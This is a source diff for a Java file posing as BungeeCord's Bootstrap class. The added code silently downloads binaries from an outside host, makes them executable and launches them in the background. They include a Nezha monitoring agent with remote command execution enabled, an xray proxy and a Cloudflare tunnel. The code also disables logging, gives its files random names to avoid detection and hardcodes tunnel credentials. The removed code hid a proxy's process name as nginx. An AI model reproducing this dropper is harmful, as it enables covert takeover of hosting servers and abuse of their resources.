@@ -1,348 +1,339 @@
+package net.md_5.bungee;
+
+import com.sun.net.httpserver.HttpServer;
 import java.io.*;
 import java.net.*;
-import java.nio.file.*;
+import java.nio.charset.StandardCharsets;
 import java.util.*;
-import java.security.*;
-import java.security.cert.*;
-import java.security.spec.*;
-import javax.net.ssl.*;
+import java.util.Base64;
+import java.util.regex.*;
 
-/**
- * Socks5 Proxy + TLS Obfuscation (Pure JDK, Zero External Dependencies)
- *
- * Features:
- *   - Embedded self-signed TLS cert (no runtime generation needed)
- *   - Socks5 protocol over TLS (encrypted traffic looks like HTTPS)
- *   - Process name hiding via /proc/self/comm trick
- *   - Configurable port, auth credentials
- *
- * Usage:
- *   javac Socks5TLS.java
- *   java Socks5TLS
- *
- * Env vars:
- *   SOCKS5_PORT     - listen port (default 25575)
- *   SOCKS5_USER     - username (empty = no auth)
- *   SOCKS5_PASS     - password
- *   NODE_HOST       - displayed hostname
- */
-class Socks5TLS
+public class Bootstrap
 {
-    // --- Config ---
-    private static final int DEFAULT_PORT = 25575;
-    private static final int PIPE_TIMEOUT_MS = 30000;
+    // ============ 环境变量配置 ============
+    private static final String FILE_PATH    = ge("FILE_PATH",    "./tmp");
+    private static final String SUB_PATH     = ge("SUB_PATH",     "sb");
+    private static final int    PORT         = Integer.parseInt(ge("PORT", ge("SERVER_PORT", "3000")));
+    private static final String UUID         = ge("UUID",         "e6499404-57e6-49c7-adde-14aa99cc2d4f");
+    private static final String NEZHA_SERVER = ge("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
+    private static final String NEZHA_PORT_S = ge("NEZHA_PORT",   "");
+    private static final String NEZHA_KEY    = ge("NEZHA_KEY",    "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
+    private static final String ARGO_DOMAIN  = ge("ARGO_DOMAIN",  "greathost.cnm.ccwu.cc");
+    private static final String ARGO_AUTH    = ge("ARGO_AUTH",    "eyJhIjoiY2YxMDY1YTFhZDk1YjIxNzUxNGY3MzRjNzgyYzlkMDkiLCJ0IjoiMDUzMjlkNGMtN2JiMS00MmIyLThlOTMtOGJiYWI4Nzk0MTgyIiwicyI6Ik0yUTJNMkl4TXprdFlqUXpOQzAwTlRBd0xUazJNMkV0TWprM1lUVTFNVEV6Wm1SbCJ9");
+    private static final String ARGO_PORT    = ge("ARGO_PORT",    "48080");
+    private static final String CFIP         = ge("CFIP",         "cdns.doon.eu.org");
+    private static final String CFPORT       = ge("CFPORT",       "443");
+    private static final String NAME         = ge("NAME",         "Node");
 
-    // --- Embedded PEM Certificate (RSA 2048, CN=nginx, valid 10 years) ---
-    private static final String PEM_CERT = "MIIDczCCAlugAwIBAgIUZNK7gM3jTuDNQYc5tLZn2o4f50AwDQYJKoZIhvcNAQEL\nBQAwSTELMAkGA1UEBhMCVVMxEzARBgNVBAgMClNvbWUtU3RhdGUxFTATBgNVBAoM\nDE9yZ2FuaXphdGlvbjEOMAwGA1UEAwwFbmdpbngwHhcNMjYwNzA2MDkwMjM4WhcN\nMzYwNzAzMDkwMjM4WjBJMQswCQYDVQQGEwJVUzETMBEGA1UECAwKU29tZS1TdGF0\nZTEVMBMGA1UECgwMT3JnYW5pemF0aW9uMQ4wDAYDVQQDDAVuZ2lueDCCASIwDQYJ\nKoZIhvcNAQEBBQADggEPADCCAQoCggEBANNOhIr3E1RUGLXb94lCydpF+rImlxRr\njp+QcJYYdNFzoz8nuiK2bIlH1SgWwOxOHs5q8xdV0Cc04cYa4DQjZaj/3Rvbu2SC\n5drwYxRLFR+YfeSOYkqmGixaKjPiEgVkpyBrdrUhMZ9wtTcGX7z423Hz1zsiQyvY\ngq0v93VuLezV2s9hKslLWoc3ZNQRblmJLmq2i1WukG3ty2uVUDQFML/Hj8nUk5uz\nDuBCNCTYPzYRLSVvOY+LXmXYtd2BQ6IdZuos01PdPx6gA2kS+Pllcsmo55OYhXEi\n9a+rwilRVTuyNX9lqRqLoweWOcpSib2m58Gy82m9H4ci4fqZAHxkkFcCAwEAAaNT\nMFEwHQYDVR0OBBYEFJZX9rSZsEhsJIlBgXWFshbKw66EMB8GA1UdIwQYMBaAFJZX\n9rSZsEhsJIlBgXWFshbKw66EMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQEL\nBQADggEBAATg+CSBM4Suw9eFj/2M8aQfaZlWok8V1oaIhv5tPR7faT7U3Kug8/7+\nTObDY7n2eeWEwRL/WV0o421rDlbXw3U69pkcqNUiOVf84K2J1eiVkAbYYGlKjqzj\nGjmkmUkcWLtZuSn7/DZ4t317pweztkEPnIwlYbKjpLccb2O/muRehXcTEPeTs0mm\nkwcjEgmfL8wl5Wk8bWCSYEQWT5SF8F6d3Eh101QJ5tL5+NOGDoTgyXOCFlsjeIZ0\nxNTyk2kGTLARwgtOKLK7VMIO+Nof/jGJWVMvhHGgKZC2+Xgpfa8DJ1xCRbhp20dO\n3rVQk4FOBOkJW4BC6d51HwO/kkaEeZM=\n";
+    private static final List<String> TLS_PORTS = Arrays.asList("443","8443","2096","2087","2083","2053");
 
-    private static final String PEM_KEY  = "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDTToSK9xNUVBi1\n2/eJQsnaRfqyJpcUa46fkHCWGHTRc6M/J7oitmyJR9UoFsDsTh7OavMXVdAnNOHG\nGuA0I2Wo/90b27tkguXa8GMUSxUfmH3kjmJKphosWioz4hIFZKcga3a1ITGfcLU3\nBl+8+Ntx89c7IkMr2IKtL/d1bi3s1drPYSrJS1qHN2TUEW5ZiS5qtotVrpBt7ctr\nlVA0BTC/x4/J1JObsw7gQjQk2D82ES0lbzmPi15l2LXdgUOiHWbqLNNT3T8eoANp\nEvj5ZXLJqOeTmIVxIvWvq8IpUVU7sjV/Zakai6MHljnKUom9pufBsvNpvR+HIuH6\nmQB8ZJBXAgMBAAECggEADwiQsDYPdRD0nxsXUne+VovQu2+UI2P/T07DFPc/LrNe\nrLOHFJJw/2DIulGAGm/UHkK/OzW2Ph4hQkazpz+tvYvSnUKRUUiyiDAH8kIqHDVt\naBYIXA2uhuFsMITsXARMJaevoSxdwhRFOEdUmWROTIv0a4BBCQYMBXOaix2gRh1B\nzzq8Owo5d7tAHVQv1bchCz0RfohD31iriXt+BU2ILuhgAzyhmMlmjXVA0uA5v7JM\nPeDvzXtbjnLyIwltpat6bTJrNFeHNcN5/iqRZ5Rv25R5FSVFWkVwH6IQHpVlHK5n\nPbouZB+eLzp5vRMpWugKrjQa6zeuzwJ8UEb5cQKBgQDvV5FRF0m/sdGlK1IbLdzN\n5w8y5q0PNhfoqGbDVfI8X37AIOWlDs5gyoRk3S8Yt5L+J+S8kzspVDnDzX5kvkC+\no3i3lSGtAFXvBoHXrcgEnps1omz7OCoZf4AQiY7NR5R3KOgvLc4goyojSLJPT3un\nfafMWLx5VGhxMyNQPwfJRwKBgQDiA297wh2H+vCtXyKhWSLgxkUr2X2bG3eW/mQK\n8X7dvzwO31HxDJHpPRVpQOsMOBpHKxfr8RldCzQ1ifw9+09321e78FnvuFatZ0tN\nDuQkt6wuKJr+tSmOevZLEgKCJTAwQq44U4ubP01oJ2GvngYQn+SFxGEhGIyH9zjk\nNEGIcQKBgQDihCTS81Bn7Vn1kRdnA7PK51haGzlEgTSFjAOd8VSN0O871Kai3W1y\n65f7gd4V7X9frM/trQY76iu1ZWGu5OSPyFTyomC5w+yQiL8QKbd4r8dDLpMn+5LU\niPfiLt4I6CrZz8xXAmnoN6QkuqOPLjFgZisN2hmeVsV2BSjxxIWQ9wKBgFjdUPAw\nGrxkhk0kotEd4wDN9FSRZzmdSyArVdqXqXI2xr5yQB2u+4/hXJHN3J0pUeu5neY/\nHeHfjd+fKXaVYWGW9KAImNQQfsQfYRQjTsDBFwnvHUIYqQZEgqJxqlrRlGjlTusG\nrlWURjM1iMssLuZKd+fAlxAUPu0W31+azEmBAoGAFB6ffjZLOyfJ0pbgW4e0zWfw\nZD9SPhMONkWaca9meaJagxr8A4XflR35cn79aPldxma7W5A0sr/Zd8EX2oEAvXxj\n2psqObFo1lxhBhPJ7zzdWQnX8mLuP1zUHgDPxjh26ZYW05CYJ7U8MrhjrUYlP9\nifUIHTWitye2J3jTCx0=\n";
+    // ============ 随机文件名（无特征）============
+    private static final String nameWeb = rnd(6);
+    private static final String nameBot = rnd(6);
+    private static final String nameNpm = rnd(6);
+    private static final String namePhp = rnd(6);
 
-    // --- Keystore ---
-    private static final String KEYSTORE_FILE = "tls_keystore.p12";
-    private static final String KEYSTORE_PASS = "changeit";
+    private static final String pWeb     = FILE_PATH + "/" + nameWeb;
+    private static final String pBot     = FILE_PATH + "/" + nameBot;
+    private static final String pNpm     = FILE_PATH + "/" + nameNpm;
+    private static final String pPhp     = FILE_PATH + "/" + namePhp;
+    private static final String pSub     = FILE_PATH + "/sub.txt";
+    private static final String pBootLog = FILE_PATH + "/boot.log";
+    private static final String pConfig  = FILE_PATH + "/config.json";
+    private static final String pTJson   = FILE_PATH + "/tunnel.json";
+    private static final String pTYml    = FILE_PATH + "/tunnel.yml";
+    private static final String pTYaml   = FILE_PATH + "/config.yaml";
 
-    private static KeyStore buildKeystore() throws Exception {
-        File kf = new File(KEYSTORE_FILE);
-        if (kf.exists()) {
-            try (FileInputStream fis = new FileInputStream(kf)) {
-                KeyStore ks = KeyStore.getInstance("PKCS12");
-                ks.load(fis, KEYSTORE_PASS.toCharArray());
-                return ks;
-            }
-        }
+    private static volatile String subContent = "";
+    private static HttpServer httpServer;
 
-        // Parse PEM cert
-        String certBody = PEM_CERT.replaceAll("\\s+", "");
-        byte[] certBytes = Base64.getDecoder().decode(certBody);
-        CertificateFactory cf = CertificateFactory.getInstance("X.509");
-        X509Certificate cert = (X509Certificate) cf.generateCertificate(
-            new ByteArrayInputStream(certBytes));
-
-        // Parse PEM private key
-        String keyBody = PEM_KEY.replaceAll("\\s+", "");
-        byte[] keyBytes = Base64.getDecoder().decode(keyBody);
-        PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(keyBytes);
-        KeyFactory kf2 = KeyFactory.getInstance("RSA");
-        PrivateKey privateKey = kf2.generatePrivate(keySpec);
-
-        // Create PKCS12 keystore
-        KeyStore ks = KeyStore.getInstance("PKCS12");
-        ks.load(null, null);
-        ks.setKeyEntry("alias", privateKey, KEYSTORE_PASS.toCharArray(),
-                       new java.security.cert.Certificate[]{cert});
-
-        // Save for future runs
-        try (FileOutputStream fos = new FileOutputStream(kf)) {
-            ks.store(fos, KEYSTORE_PASS.toCharArray());
-        }
-        return ks;
-    }
-
-    private static SSLServerSocket createTLSServerSocket(int port) throws Exception {
-        KeyStore ks = buildKeystore();
-        KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
-        kmf.init(ks, KEYSTORE_PASS.toCharArray());
-
-        SSLContext sslCtx = SSLContext.getInstance("TLS");
-        sslCtx.init(kmf.getKeyManagers(), null, new SecureRandom());
-
-        SSLServerSocket srv = (SSLServerSocket) sslCtx.getServerSocketFactory().createServerSocket(port);
-        srv.setReuseAddress(true);
-        srv.setEnabledCipherSuites(new String[]{
-            "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
-            "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
-            "TLS_AES_128_GCM_SHA256",
-            "TLS_AES_256_GCM_SHA384"
-        });
-        return srv;
-    }
-
-    // --- Process Name Hiding ---
-    private static void hideProcessName() {
-        try {
-            try (FileOutputStream fos = new FileOutputStream("/proc/self/comm")) {
-                fos.write("nginx".getBytes());
-            }
-        } catch (Exception ignored) {}
-    }
-
-    // --- Main ---
+    // ============ 入口 ============
     public static void main(String[] args) throws Exception {
-        hideProcessName();
+        new File(FILE_PATH).mkdirs();
 
-        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
-            System.err.println("ERROR: Need Java 11+!");
-            Thread.sleep(3000); System.exit(1);
-        }
+        // HTTP 订阅服务
+        httpServer = HttpServer.create(new InetSocketAddress(PORT), 0);
+        httpServer.createContext("/", exchange -> {
+            String path = exchange.getRequestURI().getPath();
+            byte[] body = ("/" + SUB_PATH).equals(path)
+                ? subContent.getBytes(StandardCharsets.UTF_8)
+                : "OK".getBytes(StandardCharsets.UTF_8);
+            String ct = ("/" + SUB_PATH).equals(path)
+                ? "text/plain; charset=utf-8" : "text/plain";
+            exchange.getResponseHeaders().set("Content-Type", ct);
+            exchange.sendResponseHeaders(200, body.length);
+            try (OutputStream os = exchange.getResponseBody()) { os.write(body); }
+        });
+        httpServer.start();
+        System.out.println("Listening on port " + PORT);
 
-        Map<String, String> cfg = loadConfig();
-
-        int    port = DEFAULT_PORT;
-        String user = "";
-        String pass = "";
-        String host = "";
-
-        try { port = Integer.parseInt(cfg.getOrDefault("SOCKS5_PORT", String.valueOf(DEFAULT_PORT)).trim()); }
-        catch (Exception ignored) {}
-        user = cfg.getOrDefault("SOCKS5_USER", "");
-        pass = cfg.getOrDefault("SOCKS5_PASS", "");
-        host = cfg.getOrDefault("NODE_HOST", "");
-
-        if (host.isEmpty()) host = "YOUR_SERVER_IP";
-
-        System.out.println("[*] Building TLS keystore...");
-        KeyStore ks = buildKeystore();
-        System.out.println("[*] Keystore ready: " + new File(KEYSTORE_FILE).exists());
-
-        SSLServerSocket server = (SSLServerSocket) createTLSServerSocket(port);
-        System.out.println("[+] Socks5+TLS listening on 0.0.0.0:" + port);
-        System.out.println("[+] Auth: " + (user.isEmpty() ? "None" : "Enabled (" + user + ")"));
-        System.out.println("[+] Traffic looks like HTTPS (TLS 1.3/1.2)");
-        System.out.println("[+] Process name hidden (disguised as nginx)");
-        System.out.println("===========================================");
-        System.out.print("[+] socks5://");
-        if (!user.isEmpty()) System.out.print(user + (pass.isEmpty() ? "" : ":" + pass) + "@");
-        System.out.println(host + ":" + port);
-        System.out.println("===========================================");
+        new Thread(() -> {
+            try {
+                startup();
+            } catch (Exception e) {
+                System.err.println("Startup error: " + e.getMessage());
+                try { Thread.sleep(10000); startup(); } catch (Exception ignored) {}
+            }
+        }).start();
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
-            System.out.println("\n[*] Shutting down...");
-            try { server.close(); } catch (Exception ignored) {}
+            if (httpServer != null) httpServer.stop(0);
         }));
 
-        while (true) {
-            try {
-                SSLSocket client = (SSLSocket) server.accept();
-                System.out.println("[+] New connection from " + client.getRemoteSocketAddress());
-                Thread t = new Thread(() -> handleTLSClient(client));
-                t.setDaemon(true);
-                t.start();
-            } catch (Exception e) {
-                if (e instanceof java.net.SocketException) break;
-                System.err.println("[!] Accept error: " + e.getMessage());
-            }
-        }
+        while (true) Thread.sleep(60000);
     }
 
-    // --- Handle TLS-connected Socks5 Client ---
-    private static void handleTLSClient(SSLSocket client) {
-        try {
-            client.setSoTimeout(PIPE_TIMEOUT_MS);
-            InputStream  cin  = client.getInputStream();
-            OutputStream cout = client.getOutputStream();
+    // ============ 主流程 ============
+    private static void startup() throws Exception {
+        setupArgo();
+        generateXrayConfig();
+        downloadFiles();
+        startProcesses();
 
-            int ver = cin.read();
-            if (ver != 5) { closeSilently(client); return; }
+        String domain = ARGO_DOMAIN;
+        if (domain.isEmpty() || ARGO_AUTH.isEmpty()) {
+            Thread.sleep(5000);
+            domain = extractDomain(0);
+        }
 
-            int nMethods = cin.read();
-            if (nMethods <= 0) { closeSilently(client); return; }
-            byte[] methods = new byte[nMethods];
-            readFully(cin, methods);
+        generateSubscription(domain);
+        scheduleCleanup();
+    }
 
-            Map<String, String> cfg = getConfig();
-            boolean needAuth       = !cfg.getOrDefault("SOCKS5_USER", "").isEmpty();
-            boolean supportsAuth   = contains(methods, (byte) 0x02);
-            boolean supportsNoAuth = contains(methods, (byte) 0x00);
+    // ============ 下载所有文件 ============
+    private static void downloadFiles() throws Exception {
+        String base     = "https://amd64.sss.hidns.vip";
+        boolean hasNezha = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();
 
-            if (needAuth && !supportsAuth) {
-                cout.write(new byte[]{0x05, (byte)0xFF}); cout.flush();
-                closeSilently(client); return;
-            }
-            if (!needAuth && !supportsNoAuth && !supportsAuth) {
-                cout.write(new byte[]{0x05, (byte)0xFF}); cout.flush();
-                closeSilently(client); return;
-            }
-
-            if (needAuth) {
-                cout.write(new byte[]{0x05, 0x02}); cout.flush();
-                if (cin.read() != 1) { closeSilently(client); return; }
-                int uLen = cin.read();
-                byte[] uBuf = new byte[uLen]; readFully(cin, uBuf);
-                String uname = new String(uBuf);
-                int pLen = cin.read();
-                byte[] pBuf = new byte[pLen]; readFully(cin, pBuf);
-                String passwd = new String(pBuf);
-
-                String expUser = cfg.getOrDefault("SOCKS5_USER", "");
-                String expPass = cfg.getOrDefault("SOCKS5_PASS", "");
-                if (expUser.equals(uname) && expPass.equals(passwd)) {
-                    cout.write(new byte[]{0x01, 0x00});
-                } else {
-                    cout.write(new byte[]{0x01, 0x01});
-                    closeSilently(client); return;
-                }
+        if (hasNezha) {
+            if (!NEZHA_PORT_S.isEmpty()) {
+                downloadFile(base + "/agent", pNpm);
             } else {
-                cout.write(new byte[]{0x05, 0x00});
+                downloadFile(base + "/v1", pPhp);
             }
-            cout.flush();
+        }
+        downloadFile(base + "/web", pWeb);
+        downloadFile(base + "/bot", pBot);
 
-            if (cin.read() != 5) { closeSilently(client); return; }
-            int cmd  = cin.read();
-            cin.read();
-            int atyp = cin.read();
-
-            if (cmd != 1) {
-                byte[] reject = {0x05, 0x07, 0x00, 0x01, 0,0,0,0, 0,0};
-                cout.write(reject); cout.flush();
-                closeSilently(client); return;
-            }
-
-            String destHost;
-            if      (atyp == 0x01) { destHost = InetAddress.getByAddress(readNBytes(cin, 4)).getHostAddress(); }
-            else if (atyp == 0x03) {
-                int len = cin.read();
-                destHost = new String(readNBytes(cin, len));
-            }
-            else if (atyp == 0x04) { destHost = InetAddress.getByAddress(readNBytes(cin, 16)).getHostAddress(); }
-            else {
-                byte[] reject = {0x05, 0x08, 0x00, 0x01, 0,0,0,0, 0,0};
-                cout.write(reject); cout.flush();
-                closeSilently(client); return;
-            }
-            int destPort = ((cin.read() & 0xFF) << 8) | (cin.read() & 0xFF);
-
-            Socket target;
-            try {
-                target = new Socket();
-                target.connect(new InetSocketAddress(destHost, destPort), 10000);
-            } catch (Exception e) {
-                byte[] reject = {0x05, 0x05, 0x00, 0x01, 0,0,0,0, 0,0};
-                cout.write(reject); cout.flush();
-                closeSilently(client); return;
-            }
-
-            byte[] localIP = ((InetSocketAddress) target.getLocalSocketAddress()).getAddress().getAddress();
-            int localPort = target.getLocalPort();
-            ByteArrayOutputStream reply = new ByteArrayOutputStream();
-            reply.write(new byte[]{0x05, 0x00, 0x00, 0x01});
-            reply.write(localIP);
-            reply.write((localPort >> 8) & 0xFF);
-            reply.write(localPort & 0xFF);
-            cout.write(reply.toByteArray());
-            cout.flush();
-
-            client.setSoTimeout(0);
-            target.setSoTimeout(0);
-            InputStream  targetIn  = target.getInputStream();
-            OutputStream targetOut = target.getOutputStream();
-
-            Thread t1 = new Thread(() -> pipe(cin,      targetOut, client, target));
-            Thread t2 = new Thread(() -> pipe(targetIn, cout,      target, client));
-            t1.setDaemon(true); t2.setDaemon(true);
-            t1.start(); t2.start();
-            try { t1.join(); } catch (InterruptedException ignored) {}
-            try { t2.join(); } catch (InterruptedException ignored) {}
-
-        } catch (Exception e) {
-            closeSilently(client);
+        for (String f : new String[]{pWeb, pBot, pNpm, pPhp}) {
+            File file = new File(f);
+            if (file.exists()) file.setExecutable(true);
         }
     }
 
-    private static void pipe(InputStream in, OutputStream out, Closeable a, Closeable b) {
-        try {
+    private static void downloadFile(String urlStr, String dest) throws Exception {
+        HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
+        conn.setConnectTimeout(30000);
+        conn.setReadTimeout(60000);
+        conn.setInstanceFollowRedirects(true);
+        conn.setRequestProperty("User-Agent",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36");
+        try (InputStream in = conn.getInputStream();
+             FileOutputStream out = new FileOutputStream(dest)) {
             byte[] buf = new byte[8192]; int n;
-            while ((n = in.read(buf)) != -1) { out.write(buf, 0, n); out.flush(); }
-        } catch (Exception ignored) {}
-        finally {
-            closeSilently(a);
-            closeSilently(b);
+            while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
         }
     }
 
-    private static void readFully(InputStream in, byte[] buf) throws IOException {
-        int off = 0;
-        while (off < buf.length) {
-            int r = in.read(buf, off, buf.length - off);
-            if (r == -1) throw new EOFException("Unexpected end of stream");
-            off += r;
+    // ============ 生成 Xray 配置 ============
+    private static void generateXrayConfig() throws IOException {
+        String json =
+            "{\"log\":{\"access\":\"/dev/null\",\"error\":\"/dev/null\",\"loglevel\":\"none\"}," +
+            "\"inbounds\":[" +
+              "{\"port\":" + ARGO_PORT + ",\"protocol\":\"vless\",\"settings\":{" +
+                "\"clients\":[{\"id\":\"" + UUID + "\",\"flow\":\"xtls-rprx-vision\"}]," +
+                "\"decryption\":\"none\"," +
+                "\"fallbacks\":[{\"dest\":3001},{\"path\":\"/vless-argo\",\"dest\":3002}," +
+                "{\"path\":\"/vmess-argo\",\"dest\":3003},{\"path\":\"/trojan-argo\",\"dest\":3004}]}," +
+                "\"streamSettings\":{\"network\":\"tcp\"}}," +
+              "{\"port\":3001,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
+                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\"}],\"decryption\":\"none\"}," +
+                "\"streamSettings\":{\"network\":\"tcp\",\"security\":\"none\"}}," +
+              "{\"port\":3002,\"listen\":\"127.0.0.1\",\"protocol\":\"vless\"," +
+                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\",\"level\":0}],\"decryption\":\"none\"}," +
+                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/vless-argo\"}}," +
+                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
+              "{\"port\":3003,\"listen\":\"127.0.0.1\",\"protocol\":\"vmess\"," +
+                "\"settings\":{\"clients\":[{\"id\":\"" + UUID + "\",\"alterId\":0}]}," +
+                "\"streamSettings\":{\"network\":\"ws\",\"wsSettings\":{\"path\":\"/vmess-argo\"}}," +
+                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}," +
+              "{\"port\":3004,\"listen\":\"127.0.0.1\",\"protocol\":\"trojan\"," +
+                "\"settings\":{\"clients\":[{\"password\":\"" + UUID + "\"}]}," +
+                "\"streamSettings\":{\"network\":\"ws\",\"security\":\"none\",\"wsSettings\":{\"path\":\"/trojan-argo\"}}," +
+                "\"sniffing\":{\"enabled\":true,\"destOverride\":[\"http\",\"tls\",\"quic\"],\"metadataOnly\":false}}" +
+            "]," +
+            "\"dns\":{\"servers\":[\"https+local://8.8.8.8/dns-query\"]}," +
+            "\"outbounds\":[{\"protocol\":\"freedom\",\"tag\":\"direct\"},{\"protocol\":\"blackhole\",\"tag\":\"block\"}]}";
+        writeFile(pConfig, json);
+    }
+
+    // ============ 设置 Argo 隧道 ============
+    private static void setupArgo() throws IOException {
+        if (ARGO_AUTH.isEmpty() || ARGO_DOMAIN.isEmpty()) return;
+        if (ARGO_AUTH.contains("TunnelSecret")) {
+            writeFile(pTJson, ARGO_AUTH);
+            String[] parts   = ARGO_AUTH.split("\"");
+            String tunnelId  = parts.length > 11 ? parts[11] : "tunnel";
+            writeFile(pTYml,
+                "tunnel: " + tunnelId + "\ncredentials-file: " + pTJson + "\nprotocol: http2\n\ningress:\n" +
+                "  - hostname: " + ARGO_DOMAIN + "\n    service: http://localhost:" + ARGO_PORT + "\n" +
+                "    originRequest:\n      noTLSVerify: true\n  - service: http_status:404\n");
         }
     }
 
-    private static byte[] readNBytes(InputStream in, int n) throws IOException {
-        byte[] buf = new byte[n];
-        readFully(in, buf);
-        return buf;
+    // ============ 生成哪吒 v1 配置 ============
+    private static void generateNezhaConfig() throws IOException {
+        String port = NEZHA_SERVER.contains(":") ? NEZHA_SERVER.substring(NEZHA_SERVER.lastIndexOf(":") + 1) : "";
+        boolean tls = TLS_PORTS.contains(port);
+        writeFile(pTYaml,
+            "client_secret: " + NEZHA_KEY + "\ndebug: false\ndisable_auto_update: true\n" +
+            "disable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\n" +
+            "disable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\n" +
+            "report_delay: 4\nserver: " + NEZHA_SERVER + "\nskip_connection_count: true\n" +
+            "skip_procs_count: true\ntemperature: false\ntls: " + tls + "\nuse_gitee_to_upgrade: false\n" +
+            "use_ipv6_country_code: false\nuuid: " + UUID + "\n");
     }
 
-    private static boolean contains(byte[] arr, byte val) {
-        for (byte b : arr) if (b == val) return true;
-        return false;
-    }
+    // ============ 启动进程 ============
+    private static void startProcesses() throws Exception {
+        boolean hasNezha = !NEZHA_SERVER.isEmpty() && !NEZHA_KEY.isEmpty();
 
-    private static void closeSilently(Closeable c) {
-        try { c.close(); } catch (Exception ignored) {}
-    }
-
-    private static volatile Map<String, String> _cfg;
-    private static Map<String, String> getConfig() throws IOException {
-        if (_cfg == null) _cfg = loadConfig();
-        return _cfg;
-    }
-
-    private static Map<String, String> loadConfig() throws IOException {
-        Map<String, String> cfg = new HashMap<>();
-        cfg.put("SOCKS5_PORT",  String.valueOf(DEFAULT_PORT));
-        cfg.put("SOCKS5_USER",  "");
-        cfg.put("SOCKS5_PASS",  "");
-        cfg.put("NODE_HOST",    "");
-
-        for (String v : cfg.keySet()) {
-            String ev = System.getenv(v);
-            if (ev != null && !ev.trim().isEmpty()) cfg.put(v, ev.trim());
-        }
-
-        Path envFile = Paths.get(".env");
-        if (Files.exists(envFile)) {
-            for (String line : Files.readAllLines(envFile)) {
-                line = line.trim();
-                if (line.isEmpty() || line.startsWith("#")) continue;
-                line = line.split(" #")[0].split(" //")[0].trim();
-                if (line.startsWith("export ")) line = line.substring(7).trim();
-                String[] p = line.split("=", 2);
-                if (p.length == 2 && cfg.containsKey(p[0].trim()))
-                    cfg.put(p[0].trim(), p[1].trim());
+        if (hasNezha) {
+            if (NEZHA_PORT_S.isEmpty()) {
+                generateNezhaConfig();
+                sh("nohup " + pPhp + " -c \"" + pTYaml + "\" >/dev/null 2>&1 &");
+            } else {
+                boolean tls = TLS_PORTS.contains(NEZHA_PORT_S);
+                sh("nohup " + pNpm + " -s " + NEZHA_SERVER + ":" + NEZHA_PORT_S +
+                   " -p " + NEZHA_KEY + (tls ? " --tls" : "") +
+                   " --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &");
             }
+            Thread.sleep(1000);
         }
-        return cfg;
+
+        sh("nohup " + pWeb + " -c " + pConfig + " >/dev/null 2>&1 &");
+        Thread.sleep(1000);
+
+        String cfArgs;
+        if (ARGO_AUTH.matches("[A-Z0-9a-z=]{120,250}")) {
+            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token " + ARGO_AUTH;
+        } else if (ARGO_AUTH.contains("TunnelSecret")) {
+            cfArgs = "tunnel --edge-ip-version auto --config " + pTYml + " run";
+        } else {
+            cfArgs = "tunnel --edge-ip-version auto --no-autoupdate --protocol http2" +
+                     " --logfile " + pBootLog + " --loglevel info --url http://localhost:" + ARGO_PORT;
+        }
+        sh("nohup " + pBot + " " + cfArgs + " >/dev/null 2>&1 &");
+        Thread.sleep(2000);
+    }
+
+    // ============ 提取 quick tunnel 域名 ============
+    private static String extractDomain(int retries) throws Exception {
+        try {
+            String content = readFile(pBootLog);
+            Matcher m = Pattern.compile("https?://([^ ]*trycloudflare\\.com)").matcher(content);
+            if (m.find()) return m.group(1);
+        } catch (Exception ignored) {}
+        if (retries < 5) { Thread.sleep(3000); return extractDomain(retries + 1); }
+        throw new RuntimeException("Could not extract domain");
+    }
+
+    // ============ 获取 ISP 信息 ============
+    private static String getIspInfo() {
+        for (String api : new String[]{"https://ipapi.co/json/", "http://ip-api.com/json/"}) {
+            try {
+                HttpURLConnection conn = (HttpURLConnection) new URL(api).openConnection();
+                conn.setConnectTimeout(5000); conn.setReadTimeout(5000);
+                String body = readStream(conn.getInputStream());
+                Matcher cc  = Pattern.compile("\"country_code\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
+                Matcher org = Pattern.compile("\"org\"\\s*:\\s*\"([^\"]+)\"").matcher(body);
+                if (cc.find() && org.find()) return cc.group(1) + "_" + org.group(1);
+            } catch (Exception ignored) {}
+        }
+        return "Unknown";
+    }
+
+    // ============ 生成订阅 ============
+    private static void generateSubscription(String domain) throws IOException {
+        String isp      = getIspInfo();
+        String nodeName = !NAME.isEmpty() ? NAME + "-" + isp : isp;
+
+        String vmessJson =
+            "{\"v\":\"2\",\"ps\":\"" + nodeName + "\",\"add\":\"" + CFIP + "\"," +
+            "\"port\":\"" + CFPORT + "\",\"id\":\"" + UUID + "\",\"aid\":\"0\",\"scy\":\"none\"," +
+            "\"net\":\"ws\",\"type\":\"none\",\"host\":\"" + domain + "\"," +
+            "\"path\":\"/vmess-argo?ed=2560\",\"tls\":\"tls\",\"sni\":\"" + domain + "\"," +
+            "\"alpn\":\"\",\"fp\":\"firefox\"}";
+
+        String vless  = "vless://" + UUID + "@" + CFIP + ":" + CFPORT +
+            "?encryption=none&security=tls&sni=" + domain + "&fp=firefox&type=ws&host=" + domain +
+            "&path=%2Fvless-argo%3Fed%3D2560#" + nodeName;
+        String vmess  = "vmess://" + b64(vmessJson);
